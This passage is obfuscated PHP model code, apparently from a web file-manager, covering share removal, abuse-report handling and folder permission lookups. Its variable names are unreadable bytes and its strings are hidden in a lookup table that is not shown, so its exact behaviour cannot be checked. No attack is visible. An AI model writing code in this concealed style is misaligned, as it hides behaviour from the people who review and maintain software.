substr($¯‰¨ª²Â[$Ô˜ı¾Ğ[584]], strpos($¯‰¨ª²Â[$Ô˜ı¾Ğ[584]], $é°ìãÁ×)); $ú™àÊÂ“ = array($Ô˜ı¾Ğ[193] => array($Ô˜ı¾Ğ[7], trim($’ã†ñÔ¾, $Ô˜ı¾Ğ[50]))); $›ÅÛˆş = Model($Ô˜ı¾Ğ[907])->where($ú™àÊÂ“)->field($Ô˜ı¾Ğ[32])->select(); $üÓÔ’¼ = array_to_keyvalue($›ÅÛˆş, $Ô˜ı¾Ğ[12], $Ô˜ı¾Ğ[32]); $üÓÔ’¼[] = $¯‰¨ª²Â[$Ô˜ı¾Ğ[32]]; return implode($Ô˜ı¾Ğ[8], $üÓÔ’¼); } protected function remove($Ä­ ğüÒ) { $¦·ÉÇÏ† =& $_SERVER[íïàËŸë]; $õÄÔ¦…³ = is_array($Ä­ ğüÒ) ? $Ä­ ğüÒ : array($Ä­ ğüÒ); for ($Ô‰¨Á» = 0; $Ô‰¨Á» < count($õÄÔ¦…³); $Ô‰¨Á»++) { $¹æòó¸Ø = $this->getInfo($õÄÔ¦…³[$Ô‰¨Á»]); if ($¹æòó¸Ø[$¦·ÉÇÏ†[663]] == $¦·ÉÇÏ†[91]) { Model($¦·ÉÇÏ†[633])->eventShare($¹æòó¸Ø[$¦·ÉÇÏ†[193]], $¦·ÉÇÏ†[2141]); } if ($¹æòó¸Ø[$¦·ÉÇÏ†[562]] == $¦·ÉÇÏ†[91]) { Model($¦·ÉÇÏ†[633])->eventShare($¹æòó¸Ø[$¦·ÉÇÏ†[193]], $¦·ÉÇÏ†[2140]); } } if (is_array($Ä­ ğüÒ)) { $Ä­ ğüÒ = array($¦·ÉÇÏ†[7], $Ä­ ğüÒ); } $ÄÑÁ¿ø¯ = array($¦·ÉÇÏ†[665] => $Ä­ ğüÒ); $´°¨Í˜ß = $this->where($ÄÑÁ¿ø¯)->delete(); if ($´°¨Í˜ß) { Model($¦·ÉÇÏ†[666])->where(array($¦·ÉÇÏ†[665] => $Ä­ ğüÒ))->delete(); } return $´°¨Í˜ß; } protected function removeBySource($Éå§ÉŸæ) { $¹áñ¼‰Á =& $_SERVER[íïàËŸë]; $”µ×”Ëª = array($¹áñ¼‰Á[491] => array($¹áñ¼‰Á[492], $Éå§ÉŸæ)); $«†’¥„• = $this->field($¹áñ¼‰Á[665])->where($”µ×”Ëª)->select(); $«†’¥„• = array_to_keyvalue($«†’¥„•, $¹áñ¼‰Á[12], $¹áñ¼‰Á[665]); if (!$«†’¥„•) { return; } $”µ×”Ëª = array($¹áñ¼‰Á[2147] => array($¹áñ¼‰Á[492], $«†’¥„•)); $this->where($”µ×”Ëª)->delete(); Model($¹áñ¼‰Á[666])->where($”µ×”Ëª)->delete(); } public function listAll($Ë¢Ü”´µ) { $˜„çÍÊá =& $_SERVER[íïàËŸë]; $û€ßÎ« = array(); if ($Ë¢Ü”´µ[$˜„çÍÊá[1782]]) { $û€ßÎ«[$˜„çÍÊá[1782]] = $Ë¢Ü”´µ[$˜„çÍÊá[1782]]; } if ($Ë¢Ü”´µ[$˜„çÍÊá[843]]) { $´ÕªüÖå = $Ë¢Ü”´µ[$˜„çÍÊá[844]] ? $Ë¢Ü”´µ[$˜„çÍÊá[844]] : strtotime(date($˜„çÍÊá[2155])); $û€ßÎ«[$˜„çÍÊá[231]] = array($˜„çÍÊá[409], array($Ë¢Ü”´µ[$˜„çÍÊá[843]], $´ÕªüÖå)); } if ($Ë¢Ü”´µ[$˜„çÍÊá[33]]) { $û€ßÎ«[$Ë¢Ü”´µ[$˜„çÍÊá[33]]] = 1; } else { $û€ßÎ«[] = array($˜„çÍÊá[562] => array($˜„çÍÊá[1101], 0), $˜„çÍÊá[663] => array($˜„çÍÊá[1101], 0), $˜„çÍÊá[2129] => $˜„çÍÊá[2082]); } if ($Ë¢Ü”´µ[$˜„çÍÊá[2078]]) { $û€ßÎ«[] = array($˜„çÍÊá[2126] => $Ë¢Ü”´µ[$˜„çÍÊá[2078]], $˜„çÍÊá[1671] => array($˜„çÍÊá[459], "\45{$Ë¢Ü”´µ[$˜„çÍÊá[2078]]}\45"), $˜„çÍÊá[2129] => $˜„çÍÊá[2082]); } $€üÙ¨ëÒ = $this->_makeOrder()->where($û€ßÎ«)->selectPage(20); if (empty($€üÙ¨ëÒ[$˜„çÍÊá[445]])) { return array(); } $this->_listDataApply($€üÙ¨ëÒ[$˜„çÍÊá[445]]); return $€üÙ¨ëÒ; } public function listDataApply($ßë²¢‚·) { $this->_listDataApply($ßë²¢‚·); return $ßë²¢‚·; } private function _listDataApply(&$Ï½ÚÔóÓ) { $²ÕÆ¹ÅÒ =& $_SERVER[íïàËŸë]; $â¸Œ…­¿ = array_to_keyvalue($Ï½ÚÔóÓ, $²ÕÆ¹ÅÒ[12], $²ÕÆ¹ÅÒ[1782]); $å÷¢ÛË = Model($²ÕÆ¹ÅÒ[598])->userListInfo(array_unique($â¸Œ…­¿)); $‹“¡üãš = array_to_keyvalue($Ï½ÚÔóÓ, $²ÕÆ¹ÅÒ[12], $²ÕÆ¹ÅÒ[193]); $Œ‡şÒã´ = Model($²ÕÆ¹ÅÒ[907])->sourceListInfo($‹“¡üãš, !0); foreach ($Ï½ÚÔóÓ as $æÌß¼ø­ => &$…„¢’úŒ) { $à½é†¢õ = $…„¢’úŒ[$²ÕÆ¹ÅÒ[1782]]; $…„¢’úŒ[$²ÕÆ¹ÅÒ[2156]] = $å÷¢ÛË[$à½é†¢õ] ? $å÷¢ÛË[$à½é†¢õ] : !1; $¡åÎå«÷ = $…„¢’úŒ[$²ÕÆ¹ÅÒ[193]]; $…„¢’úŒ[$²ÕÆ¹ÅÒ[90]] = $Œ‡şÒã´[$¡åÎå«÷] ? $Œ‡şÒã´[$¡åÎå«÷] : !1; if ($…„¢’úŒ[$²ÕÆ¹ÅÒ[90]][$²ÕÆ¹ÅÒ[505]] == $²ÕÆ¹ÅÒ[91]) { unset($Ï½ÚÔóÓ[$æÌß¼ø­]); } if ($…„¢’úŒ[$²ÕÆ¹ÅÒ[90]] != $²ÕÆ¹ÅÒ[228] && !$…„¢’úŒ[$²ÕÆ¹ÅÒ[90]]) { unset($Ï½ÚÔóÓ[$æÌß¼ø­]); } } unset($…„¢’úŒ); $Ï½ÚÔóÓ = array_values($Ï½ÚÔóÓ); } private function _makeOrder($îâ¦×¶ô = '') { $Ğ ¡Ëâµ =& $_SERVER[íïàËŸë]; $³í–Ë« = array($Ğ ¡Ëâµ[231], $Ğ ¡Ëâµ[844], $Ğ ¡Ëâµ[2143], $Ğ ¡Ëâµ[2144]); $ù®Çîà = array($Ğ ¡Ëâµ[523] => $Ğ ¡Ëâµ[524], $Ğ ¡Ëâµ[525] => $Ğ ¡Ëâµ[526]); $‡ÉÙğ¢ = Input::get($Ğ ¡Ëâµ[530], $Ğ ¡Ëâµ[7], $Ğ ¡Ëâµ[497], $³í–Ë«); $Öâ¥Åá¿ = Input::get($Ğ ¡Ëâµ[531], $Ğ ¡Ëâµ[7], $Ğ ¡Ëâµ[2157], array($Ğ ¡Ëâµ[2075], $Ğ ¡Ëâµ[525])); $Öâ¥Åá¿ = $ù®Çîà[$Öâ¥Åá¿]; $îâ¦×¶ô = $îâ¦×¶ô . "{$‡ÉÙğ¢}\x20{$Öâ¥Åá¿}"; return $this->order($îâ¦×¶ô); } public function reportAdd($ôŸ©¶÷À) { $Ñ®·ùŠ€ =& $_SERVER[íïàËŸë]; $¼ıã×Û  = array($Ñ®·ùŠ€[665] => $ôŸ©¶÷À[$Ñ®·ùŠ€[665]], $Ñ®·ùŠ€[1782] => USER_ID); if (Model($Ñ®·ùŠ€[2153])->where($¼ıã×Û )->find()) { return !1; } $­»à¸åä = array($Ñ®·ùŠ€[665] => $ôŸ©¶÷À[$Ñ®·ùŠ€[665]], $Ñ®·ùŠ€[1671] => $ôŸ©¶÷À[$Ñ®·ùŠ€[1671]], $Ñ®·ùŠ€[193] => $ôŸ©¶÷À[$Ñ®·ùŠ€[193]], $Ñ®·ùŠ€[541] => $ôŸ©¶÷À[$Ñ®·ùŠ€[541]], $Ñ®·ùŠ€[1782] => USER_ID, $Ñ®·ùŠ€[33] => $ôŸ©¶÷À[$Ñ®·ùŠ€[33]], $Ñ®·ùŠ€[526] => $ôŸ©¶÷À[$Ñ®·ùŠ€[526]]); return Model($Ñ®·ùŠ€[2153])->add($­»à¸åä); } public function reportList($ÄğóèÒ) { $ğ±¨Šß¨ =& $_SERVER[íïàËŸë]; $Êâ³×½È = array(); if ($ÄğóèÒ[$ğ±¨Šß¨[843]]) { $œÉÚ˜•Î = $ÄğóèÒ[$ğ±¨Šß¨[844]] ? $ÄğóèÒ[$ğ±¨Šß¨[844]] : strtotime(date($ğ±¨Šß¨[2155])); $Êâ³×½È[$ğ±¨Šß¨[231]] = array($ğ±¨Šß¨[409], array($ÄğóèÒ[$ğ±¨Šß¨[843]], $œÉÚ˜•Î)); } if (isset($ÄğóèÒ[$ğ±¨Šß¨[33]]) && in_array($ÄğóèÒ[$ğ±¨Šß¨[33]], array($ğ±¨Šß¨[91], $ğ±¨Šß¨[510], $ğ±¨Šß¨[2158], $ğ±¨Šß¨[2159], $ğ±¨Šß¨[2160]))) { $Êâ³×½È[$ğ±¨Šß¨[33]] = $ÄğóèÒ[$ğ±¨Šß¨[33]]; } if (isset($ÄğóèÒ[$ğ±¨Šß¨[833]]) && in_array($ÄğóèÒ[$ğ±¨Šß¨[833]], array($ğ±¨Šß¨[228], $ğ±¨Šß¨[91], $ğ±¨Šß¨[510], $ğ±¨Šß¨[2158]))) { $Êâ³×½È[$ğ±¨Šß¨[833]] = $ÄğóèÒ[$ğ±¨Šß¨[833]]; } $–Áâ× = Input::get($ğ±¨Šß¨[531], $ğ±¨Šß¨[7], $ğ±¨Šß¨[2157], array($ğ±¨Šß¨[2075], $ğ±¨Šß¨[525])); $÷Úœ•Ã¾ = array($ğ±¨Šß¨[523] => $ğ±¨Šß¨[524], $ğ±¨Šß¨[525] => $ğ±¨Šß¨[526]); $â™ÓÏ = $ğ±¨Šß¨[2161] . $÷Úœ•Ã¾[$–Áâ×]; $öæ–·®Â = Model($ğ±¨Šß¨[2153])->where($Êâ³×½È)->order($â™ÓÏ)->selectPage(20); if (empty($öæ–·®Â[$ğ±¨Šß¨[445]])) { return array(); } $ÃçİüöÖ = array_to_keyvalue_group($öæ–·®Â[$ğ±¨Šß¨[445]], $ğ±¨Šß¨[833], $ğ±¨Šß¨[665]); if (!empty($ÃçİüöÖ[0])) { $ÄğóèÒ = $ÃçİüöÖ[0]; $Êâ³×½È = array($ğ±¨Šß¨[665] => array($ğ±¨Šß¨[7], $ÄğóèÒ)); $¹úğÕ‘º = $this->where($Êâ³×½È)->field($ğ±¨Šß¨[665])->select(); $¹úğÕ‘º = array_to_keyvalue($¹úğÕ‘º, $ğ±¨Šß¨[12], $ğ±¨Šß¨[665]); $¥à½¡¸ = array_diff($ÄğóèÒ, $¹úğÕ‘º); if (!empty($¥à½¡¸)) { foreach ($öæ–·®Â[$ğ±¨Šß¨[445]] as $Ş€Àğ€Ò => $£Äõúª) { if (in_array($£Äõúª[$ğ±¨Šß¨[665]], $¥à½¡¸)) { unset($öæ–·®Â[$ğ±¨Šß¨[445]][$Ş€Àğ€Ò]); } } } } $this->_listDataApply($öæ–·®Â[$ğ±¨Šß¨[445]]); return $öæ–·®Â; } public function reportStatus($ıš£Û·Ó) { $¨ø•¢ì =& $_SERVER[íïàËŸë]; $Â¶€¹€× = array($¨ø•¢ì[475] => $ıš£Û·Ó[$¨ø•¢ì[475]]); $ôöÊ÷Î¿ = Model($¨ø•¢ì[2153])->where($Â¶€¹€×)->field($¨ø•¢ì[2162])->find(); if (!$ôöÊ÷Î¿) { return !1; } $ğÒ­ÔÍ = array($¨ø•¢ì[833] => $ıš£Û·Ó[$¨ø•¢ì[833]]); if ($ıš£Û·Ó[$¨ø•¢ì[833]] == $¨ø•¢ì[2158] && $ôöÊ÷Î¿[$¨ø•¢ì[833]] == $¨ø•¢ì[2158]) { $ğÒ­ÔÍ[$¨ø•¢ì[833]] = 0; } $ˆ¤•óêå = Model($¨ø•¢ì[2153])->where($Â¶€¹€×)->save($ğÒ­ÔÍ); if ($ıš£Û·Ó[$¨ø•¢ì[833]] == $¨ø•¢ì[510]) { if ($ôöÊ÷Î¿[$¨ø•¢ì[541]] != $¨ø•¢ì[228] && $this->shareFileMeta($ôöÊ÷Î¿[$¨ø•¢ì[541]])) { $this->shareFileMeta($ôöÊ÷Î¿[$¨ø•¢ì[541]], 0); } $this->remove($ôöÊ÷Î¿[$¨ø•¢ì[665]]); return !0; } if ($ˆ¤•óêå && $ıš£Û·Ó[$¨ø•¢ì[833]] == $¨ø•¢ì[2158]) { $üæ¦½ñ¬ = $ğÒ­ÔÍ[$¨ø•¢ì[833]] == $¨ø•¢ì[2158] ? 1 : 0; $this->shareFileMeta($ôöÊ÷Î¿[$¨ø•¢ì[541]], $üæ¦½ñ¬); $this->removeByFile($ôöÊ÷Î¿[$¨ø•¢ì[541]]); } return $ˆ¤•óêå; } private function removeByFile($„«õø½) { $ïÈÓü“ =& $_SERVER[íïàËŸë]; $Ì™îä†Õ = Model($ïÈÓü“[907])->where(array($ïÈÓü“[541] => $„«õø½))->field($ïÈÓü“[193])->select(); $¿¿ğÔ±ñ = array_to_keyvalue($Ì™îä†Õ, $ïÈÓü“[12], $ïÈÓü“[193]); $µœÜ = array($ïÈÓü“[193] => array($ïÈÓü“[7], $¿¿ğÔ±ñ), $ïÈÓü“[562] => 1); $Ì™îä†Õ = $this->where($µœÜ)->field($ïÈÓü“[665])->select(); if (empty($Ì™îä†Õ)) { return; } $”±ŞÁ±å = array_to_keyvalue($Ì™îä†Õ, $ïÈÓü“[12], $ïÈÓü“[665]); $this->remove($”±ŞÁ±å); } private function shareFileMeta($ıâŠÈõ¼, $æ®¸ûÄÀ = null) { $½÷²è¢Ä =& $_SERVER[íïàËŸë]; $ã—ğ–ù = array($½÷²è¢Ä[541] => $ıâŠÈõ¼, $½÷²è¢Ä[97] => $½÷²è¢Ä[2163]); if (is_null($æ®¸ûÄÀ)) { return Model($½÷²è¢Ä[2164])->where($ã—ğ–ù)->find(); } $ã—ğ–ù[$½÷²è¢Ä[450]] = $æ®¸ûÄÀ; Model($½÷²è¢Ä[2164])->add($ã—ğ–ù, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\162\x63\x65\137\141\x75\164\x68"; public function getAuth($Ñ°à‘Ó) { $ï¾â·“› =& $_SERVER[íïàËŸë]; $¥“‚–½ú = $this->sourceAuthSelect($Ñ°à‘Ó); $áËÊëû† = array(); $²ª¼İ¸† = array(); $¬³ìõÛÙ = 2 << 25; foreach ($¥“‚–½ú as $‚”æåÈ³) { $Ä«Ö´—¸ = Model($ï¾â·“›[571])->listData($‚”æåÈ³[$ï¾â·“›[2088]]); if (!$Ä«Ö´—¸) { continue; } $áËÊëû†[] = $‚”æåÈ³; $ÈÈÉæ…ñ = 0; if ($‚”æåÈ³[$ï¾â·“›[190]] == SourceModel::TYPE_GROUP) { $ÈÈÉæ…ñ = $¬³ìõÛÙ * 2; } if ($‚”æåÈ³[$ï¾â·“›[190]] == SourceModel::TYPE_USER) { $ÈÈÉæ…ñ = $¬³ìõÛÙ; } if ($‚”æåÈ³[$ï¾â·“›[190]] == SourceModel::TYPE_USER && $‚”æåÈ³[$ï¾â·“›[569]] == $ï¾â·“›[228]) { $ÈÈÉæ…ñ = 0; } $²ª¼İ¸†[] = $Ä«Ö´—¸[$ï¾â·“›[487]] + $ÈÈÉæ…ñ; } array_multisort($²ª¼İ¸†, SORT_DESC, $áËÊëû†); return $áËÊëû†; } public function sourceAuthSelect($‰è®ÑÓÚ) { $æöÀ§ê¶ =& $_SERVER[íïàËŸë]; static $Ì€Ş£¨ = array(); $¥ÎÂâóÜ = is_array($‰è®ÑÓÚ) ? !1 : !0; if ($¥ÎÂâóÜ) { $‰è®ÑÓÚ = array($‰è®ÑÓÚ); } $Ïë¬¹æı = array(); foreach ($‰è®ÑÓÚ as $ñãüüœô) { if (isset($Ì€Ş£¨[$ñãüüœô])) { $Ïë¬¹æı[$ñãüüœô] = $Ì€Ş£¨[$ñãüüœô]; } } if (count($Ïë¬¹æı) == count($‰è®ÑÓÚ)) { return $¥ÎÂâóÜ ? $Ïë¬¹æı[$‰è®ÑÓÚ[0]] : $Ïë¬¹æı; } $â˜şœÍÉ = $æöÀ§ê¶[2165]; $ãü¼‹–¹ = array($æöÀ§ê¶[193] => array($æöÀ§ê¶[7], $‰è®ÑÓÚ)); $óÚåËñ = $this->field($â˜şœÍÉ)->order($æöÀ§ê¶[475])->where($ãü¼‹–¹)->select(); $Ç·ò–¿­ = array_to_keyvalue_group($óÚåËñ, $æöÀ§ê¶[193]); foreach ($‰è®ÑÓÚ as $ñãüüœô) { $Ì€Ş£¨[$ñãüüœô] = $Ç·ò–¿­[$ñãüüœô] ? $Ç·ò–¿­[$ñãüüœô] : array(); } if ($¥ÎÂâóÜ) { return $óÚåËñ; } return $Ç·ò–¿­; } public function setAuth($ïŠ´›©–, $ƒ¨¶‰˜ï) { $“øìÈËŒ =& $_SERVER[íïàËŸë]; $–È¼Ÿü = Model($“øìÈËŒ[1428])->sourceInfo($ïŠ´›©–); if (!$–È¼Ÿü) { return !1; } if ($–È¼Ÿü[$“øìÈËŒ[190]] != SourceModel::TYPE_GROUP) { return !1; } $¬ÑĞÔÔ = 1; $ÀØ‹ğ½ù = $–È¼Ÿü[$“øìÈËŒ[569]]; if ($ÀØ‹ğ½ù != $¬ÑĞÔÔ) { $’´íá¤‰ = array($“øìÈËŒ[1980] => $ÀØ‹ğ½ù); $Û¼Ë‡ÒÍ = Model($“øìÈËŒ[2074])->field($“øìÈËŒ[1782])->where($’´íá¤‰)->select(); $Û¼Ë‡ÒÍ = array_to_keyvalue($Û¼Ë‡ÒÍ, $“øìÈËŒ[12], $“øìÈËŒ[1782]); } $ÀÄ™Á‚ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $İôîîÊ¹ = array(); foreach ($ƒ¨¶‰˜ï as $ïšŸœœ¯) { if (!in_array($ïšŸœœ¯[$“øìÈËŒ[190]], $ÀÄ™Á‚)) { show_json(LNG($“øìÈËŒ[2166]), !1); } if ($ÀØ‹ğ½ù != $¬ÑĞÔÔ) { if ($ïšŸœœ¯[$“øìÈËŒ[190]] == SourceModel::TYPE_GROUP) { } if ($ïšŸœœ¯[$“øìÈËŒ[569]] != 0 && !in_array($ïšŸœœ¯[$“øìÈËŒ[569]], $Û¼Ë‡ÒÍ)) { } } if ($ïšŸœœ¯[$“øìÈËŒ[569]] == 0) { $ïšŸœœ¯[$“øìÈËŒ[190]] = SourceModel::TYPE_USER; } $İôîîÊ¹[] = array($“øìÈËŒ[193] => $ïŠ´›©–, $“øìÈËŒ[190] => intval($ïšŸœœ¯[$“øìÈËŒ[190]]), $“øìÈËŒ[569] => intval($ïšŸœœ¯[$“øìÈËŒ[569]]), $“øìÈËŒ[2088] => intval($ïšŸœœ¯[$“øìÈËŒ[2088]]) ? intval($ïšŸœœ¯[$“øìÈËŒ[2088]]) : 0, $“øìÈËŒ[2148] => intval($ïšŸœœ¯[$“øìÈËŒ[2148]]) ? intval($ïšŸœœ¯[$“øìÈËŒ[2148]]) : -1); } $this->where(array($“øìÈËŒ[491] => $ïŠ´›©–))->delete(); $this->addAll($İôîîÊ¹); return !0; } public function authClear($¨‘°ÈÒó) { $Ûõ©Äœõ =& $_SERVER[íïàËŸë]; $–‰äåÀÊ = Model($Ûõ©Äœõ[1428])->sourceInfo($¨‘°ÈÒó); $ÈˆŞ†‰ = array($¨‘°ÈÒó); if ($–‰äåÀÊ[$Ûõ©Äœõ[485]] == $Ûõ©Äœõ[91]) { $©Î—¬ÍÓ = array($Ûõ©Äœõ[652] => array($Ûõ©Äœõ[612], $–‰äåÀÊ[$Ûõ©Äœõ[584]] . $¨‘°ÈÒó . $Ûõ©Äœõ[613])); $ÈˆŞ†‰ = Model($Ûõ©Äœõ[1428])->field($Ûõ©Äœõ[491])->where($©Î—¬ÍÓ)->getField($Ûõ©Äœõ[193], !0); $ÈˆŞ†‰[] = $¨‘°ÈÒó; } $this->where(array($Ûõ©Äœõ[491] => array($Ûõ©Äœõ[492], $ÈˆŞ†‰)))->delete(); return !0; } public function getAllChildren($ªùóüåğ) { $ßÉœ±ª =& $_SERVER[íïàËŸë]; $ë·ˆ¾òÊ = Model($ßÉœ±ª[1428])->sourceInfo($ªùóüåğ); if ($ë·ˆ¾òÊ[$ßÉœ±ª[485]] != $ßÉœ±ª[91]) { return $this->sourceListAuth(array($ªùóüåğ)); } if ($ë·ˆ¾òÊ[$ßÉœ±ª[190]] != SourceModel::TYPE_GROUP) { return array(); } $÷†·­âÉ = 1; $‘Èî¹Šğ = array($ªùóüåğ); if ($ë·ˆ¾òÊ[$ßÉœ±ª[192]] == $ßÉœ±ª[228] && $ë·ˆ¾òÊ[$ßÉœ±ª[569]] != $÷†·­âÉ) { $‘Èî¹Šğ = $this->groupChidldAllRootSource($ë·ˆ¾òÊ[$ßÉœ±ª[569]]); } $£É·í… = $this->field($ßÉœ±ª[193])->group($ßÉœ±ª[193])->select(); $£É·í… = array_to_keyvalue($£É·í…, $ßÉœ±ª[12], $ßÉœ±ª[193]); if (!$£É·í…) { return array(); } $š¬¬ª·³ = $ßÉœ±ª[2167]; $úšåİõ = array($ßÉœ±ª[193] => array($ßÉœ±ª[7], $£É·í…), $ßÉœ±ª[505] => $ßÉœ±ª[228]); $ËªÄ¨”ç = Model($ßÉœ±ª[907])->field($š¬¬ª·³)->where($úšåİõ)->select(); $ë¨×œ§ù = array($ªùóüåğ); foreach ($ËªÄ¨”ç as $€ßçãËè) { foreach ($‘Èî¹Šğ as $ìŠÄ£û«) { $áÓÜĞÇÆ = $ßÉœ±ª[50] . $ìŠÄ£û« . $ßÉœ±ª[50]; $«şİ‚‡ = $€ßçãËè[$ßÉœ±ª[584]] . $€ßçãËè[$ßÉœ±ª[193]] . $ßÉœ±ª[50]; if (strstr($«şİ‚‡, $áÓÜĞÇÆ)) { $ë¨×œ§ù[] = $€ßçãËè[$ßÉœ±ª[193]]; break; } } } return $this->sourceListAuth($ë¨×œ§ù); } private function sourceListAuth($ıÑŒÈ) { $Ó²ğŒ¹ =& $_SERVER[íïàËŸë]; $¦”™ç˜ş = Model($Ó²ğŒ¹[1428])->sourceListInfo($ıÑŒÈ, !0); $ÌÑ–éÌ¾ = $this->sourceAuthSelect($ıÑŒÈ); $Ààï = array(); $ò€ˆ¬¨­ = array(); foreach ($¦”™ç˜ş as $ÄˆÄè©Ğ) { unset($ÄˆÄè©Ğ[$Ó²ğŒ¹[529]]); unset($ÄˆÄè©Ğ[$Ó²ğŒ¹[527]]); unset($ÄˆÄè©Ğ[$Ó²ğŒ¹[487]]); unset($ÄˆÄè©Ğ[$Ó²ğŒ¹[90]]); $ÀÀˆ£ßÃ = $ÌÑ–éÌ¾[$ÄˆÄè©Ğ[$Ó²ğŒ¹[193]]]; if (!$ÀÀˆ£ßÃ) { continue; } $ÄˆÄè©Ğ[$Ó²ğŒ¹[2168]] = $this->authTargetInfo($ÀÀˆ£ßÃ); $ÄˆÄè©Ğ[$Ó²ğŒ¹[582]] = rtrim($ÄˆÄè©Ğ[$Ó²ğŒ¹[588]], $Ó²ğŒ¹[8]) . $Ó²ğŒ¹[8] . ltrim($ÄˆÄè©Ğ[$Ó²ğŒ¹[582]], $Ó²ğŒ¹[8]); $Ààï[] = $ÄˆÄè©Ğ; $ª²ÍñŠë = count(explode($Ó²ğŒ¹[8], trim($ÄˆÄè©Ğ[$Ó²ğŒ¹[582]], $Ó²ğŒ¹[8]))); $ò€ˆ¬¨­[] = $ª²ÍñŠë + ($ÄˆÄè©Ğ[$Ó²ğŒ¹[33]] == $Ó²ğŒ¹[78] ? 0 : 1000); } array_multisort($ò€ˆ¬¨­, SORT_ASC, $Ààï); return $Ààï; } private function groupChidldAllRootSource($ÊÇ¤Ñ–») { $èøÁØ î =& $_SERVER[íïàËŸë]; $ó¿šøà = Model($èøÁØ î[2169])->groupChildrenAll($ÊÇ¤Ñ–»); $¥ÎÃ×ÂÕ = array($èøÁØ î[192] => 0, $èøÁØ î[569] => array($èøÁØ î[7], $ó¿šøà), $èøÁØ î[190] => SourceModel::TYPE_GROUP); $ÔùÜ·À¿ = Model($èøÁØ î[907])->field($èøÁØ î[193])->where($¥ÎÃ×ÂÕ)->select(); $ÔùÜ·À¿ = array_to_keyvalue($ÔùÜ·À¿, $èøÁØ î[12], $èøÁØ î[193]); return $ÔùÜ·À¿; } private function authTargetInfo($Œ·ü„ê÷) { $ûò°ß™ =& $_SERVER[íïàËŸë]; $ç®¿Û¹Ü = array(); $££Äãô = array(); $ü¢ãøŠ® = 2 << 25; foreach ($Œ·ü„ê÷ as $¹Ï²¤œ°) { $ùëÔšé¤ = Model($ûò°ß™[571])->listData($¹Ï²¤œ°[$ûò°ß™[2088]]); if (!$ùëÔšé¤) { continue; } if ($¹Ï²¤œ°[$ûò°ß™[190]] == SourceModel::TYPE_USER) { $æÇšÏ– = Model($ûò°ß™[577])->getInfoSimpleOuter($¹Ï²¤œ°[$ûò°ß™[569]]); if ($æÇšÏ–[$ûò°ß™[1782]] == $ûò°ß™[1284]) { continue; } if ($æÇšÏ–[$ûò°ß™[1782]] == $ûò°ß™[228]) { $æÇšÏ–[$ûò°ß™[32]] = LNG($ûò°ß™[2170]); } } else { $æÇšÏ– = Model($ûò°ß™[585])->getInfoSimple($¹Ï²¤œ°[$ûò°ß™[569]]); } if (!$æÇšÏ–) { continue; } $æÇšÏ–[$ûò°ß™[540]] = $ùëÔšé¤; $ç®¿Û¹Ü[] = $æÇšÏ–; $«à¤è„â = 0; if ($¹Ï²¤œ°[$ûò°ß™[190]] == SourceModel::TYPE_GROUP) { $«à¤è„â = $ü¢ãøŠ® * 2; } if ($¹Ï²¤œ°[$ûò°ß™[190]] == SourceModel::TYPE_USER) { $«à¤è„â = $ü¢ãøŠ®; } if ($¹Ï²¤œ°[$ûò°ß™[190]] == SourceModel::TYPE_USER && $¹Ï²¤œ°[$ûò°ß™[569]] == $ûò°ß™[228]) { $«à¤è„â = 0; } $££Äãô[] = $ùëÔšé¤[$ûò°ß™[487]] + $«à¤è„â; } array_multisort($££Äãô, SORT_DESC, $ç®¿Û¹Ü); return $ç®¿Û¹Ü; } public function getAllChildrenByUser($•ùÎæ¬¤, $¸´¤İ¦) { $ü¡„¤Ì“ =& $_SERVER[íïàËŸë]; $°ˆâ¬– = Model($ü¡„¤Ì“[598])->getInfo($¸´¤İ¦); if (!$¸´¤İ¦ || !$•ùÎæ¬¤ || !$°ˆâ¬–) { return array(); } $¥ë×ÈÉ¶ = Model($ü¡„¤Ì“[1428])->sourceInfo($•ùÎæ¬¤); $ĞÂŸ¥ï² = array(); $ÖáˆßğÚ = 1; if ($¥ë×ÈÉ¶[$ü¡„¤Ì“[192]] == $ü¡„¤Ì“[228] && $¥ë×ÈÉ¶[$ü¡„¤Ì“[569]] != $ÖáˆßğÚ && $this->groupContainUser($¥ë×ÈÉ¶[$ü¡„¤Ì“[569]], $¸´¤İ¦)) { foreach ($°ˆâ¬–[$ü¡„¤Ì“[2171]] as $¶£‡ò¾) { $‘Òµ™ = Model($ü¡„¤Ì“[585])->getInfo($¶£‡ò¾[$ü¡„¤Ì“[1980]]); $ şØ ëŸ = Model($ü¡„¤Ì“[598])->getInfoSimpleOuter($¸´¤İ¦); $ şØ ëŸ[$ü¡„¤Ì“[540]] = $¶£‡ò¾[$ü¡„¤Ì“[487]]; if (Model($ü¡„¤Ì“[571])->authCheckAction($¶£‡ò¾[$ü¡„¤Ì“[487]][$ü¡„¤Ì“[487]], $ü¡„¤Ì“[2001])) { continue; } $¦ç–Ÿ¾ = array($ü¡„¤Ì“[32] => $ü¡„¤Ì“[1304] . $‘Òµ™[$ü¡„¤Ì“[32]], $ü¡„¤Ì“[193] => $‘Òµ™[$ü¡„¤Ì“[90]][$ü¡„¤Ì“[193]], $ü¡„¤Ì“[87] => KodIO::make($‘Òµ™[$ü¡„¤Ì“[90]][$ü¡„¤Ì“[193]]), $ü¡„¤Ì“[192] => $ü¡„¤Ì“[228], $ü¡„¤Ì“[190] => $ü¡„¤Ì“[578], $ü¡„¤Ì“[33] => $ü¡„¤Ì“[616], $ü¡„¤Ì“[582] => $‘Òµ™[$ü¡„¤Ì“[589]], $ü¡„¤Ì“[1980] => $‘Òµ™[$ü¡„¤Ì“[1980]], $ü¡„¤Ì“[586] => $‘Òµ™[$ü¡„¤Ì“[192]], $ü¡„¤Ì“[2168] => array($ şØ ëŸ)); $ĞÂŸ¥ï²[$¦ç–Ÿ¾[$ü¡„¤Ì“[193]]] = $¦ç–Ÿ¾; } } $ü±òôß = array(); $”’ğêã¿ = $this->getAllChildren($•ùÎæ¬¤); foreach ($”’ğêã¿ as $¥Š¶Ğ°ñ) { $’¬·âîº = !1; foreach ($¥Š¶Ğ°ñ[$ü¡„¤Ì“[2168]] as $ Â’Êá) { if ($ Â’Êá[$ü¡„¤Ì“[1782]]) { if ($ Â’Êá[$ü¡„¤Ì“[1782]] == $¸´¤İ¦) { $’¬·âîº = !0; break; } } if ($ Â’Êá[$ü¡„¤Ì“[1980]]) { if ($this->groupContainUser($ Â’Êá[$ü¡„¤Ì“[1980]], $¸´¤İ¦)) { $’¬·âîº = !0; break; } } } if ($’¬·âîº) { $ü±òôß[] = $¥Š¶Ğ°ñ; } $Ñº‹ãÀÙ = 